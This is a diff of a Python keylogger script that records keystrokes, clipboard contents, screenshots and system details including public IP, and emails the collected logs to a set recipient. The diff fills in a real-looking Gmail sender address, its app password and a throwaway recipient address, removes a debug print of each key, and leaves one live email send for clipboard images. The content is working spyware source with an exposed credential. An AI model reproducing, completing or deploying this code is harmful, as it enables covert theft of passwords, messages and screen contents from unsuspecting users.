@@ -15,17 +15,17 @@ from requests import get
 from multiprocessing import Process, freeze_support
 from PIL import ImageGrab, Image
 
-file_path = "C:\\upload\\path\\to\\the\\keyloggerV1\\folder"
+file_path = "C:\\Users\\LENOVO\\Desktop\\bitskrieg\\keyloggerV1"
 extend = "\\"
 file_info = "key_log.txt"
 sys_info = "sysinfo.txt"
 clipboard_info = "clipinfo.txt"
 scinfo = "screenshot.png"
 
-email_address = "email address you are sending log files from"
-password = "pw of email"
+email_address = "keytest762@gmail.com"
+password = "fzhyfkpzkzkqrmxq"
 
-toaddress = "email to send the log info"
+toaddress = "mewofo3604@operades.com"
 
 time_itr = 15
 iterationsEnd = 3
@@ -66,7 +66,7 @@ def send_email(filename, attachment, toaddress):
 
     s.quit()
 
-send_email(file_info, file_path+extend+file_info, toaddress)
+#send_email(file_info, file_path+extend+file_info, toaddress)
 
 # get computer information(IP,hostname)
 def comp_info():
@@ -76,7 +76,7 @@ def comp_info():
         IPAddr = socket.gethostbyname(hostname)
         # trying to get Public IP(doesn't work)
         try: 
-            public_IP = get("hhtps://api.ipify.org").text # service is down
+            public_IP = get("https://ifconfig.me").text
             s_info.write("Public IP address: "+ public_IP+"\n")
         except Exception:
             s_info.write("Couldn't access public IP"+"\n")
@@ -85,7 +85,7 @@ def comp_info():
         s_info.write("Machine: "+platform.machine()+"\n")
         s_info.write("private IP: " + IPAddr+"\n")
 comp_info()
-send_email(sys_info, file_path + extend + sys_info, toaddress)
+#send_email(sys_info, file_path + extend + sys_info, toaddress)
 
 def copy_clipboard():
     with open(file_path+extend+clipboard_info,"a") as c_info:
@@ -99,13 +99,13 @@ def copy_clipboard():
         except:
             c_info.write("Clipboard couldn't be pasted(Might not be a text)")
 
-        # If an image is copied
+        # If image is coppied
         image = ImageGrab.grabclipboard()
         if isinstance(image, Image.Image):
             image.save(file_path+extend+"clipboard_image.png")
             send_email("clipboard_image.png", file_path + extend + "clipboard_image.png", toaddress)
         else:
-            exit
+            exit()
 
 
 def screenshot():
@@ -127,7 +127,6 @@ while iterations < iterationsEnd:
         keys.append(key)
         count += 1
         currentTime = time.time()
-        print(key)
 
         if count >= 1:
             count = 0
@@ -159,10 +158,10 @@ while iterations < iterationsEnd:
             f.write(" ")
 
         screenshot()
-        send_email(scinfo, file_path + extend + scinfo, toaddress)
+        #send_email(scinfo, file_path + extend + scinfo, toaddress)
 
         copy_clipboard()
-        send_email(clipboard_info, file_path + extend + clipboard_info, toaddress)
+        #send_email(clipboard_info, file_path + extend + clipboard_info, toaddress)
         
         iterations+=1
         currentTime = time.time()
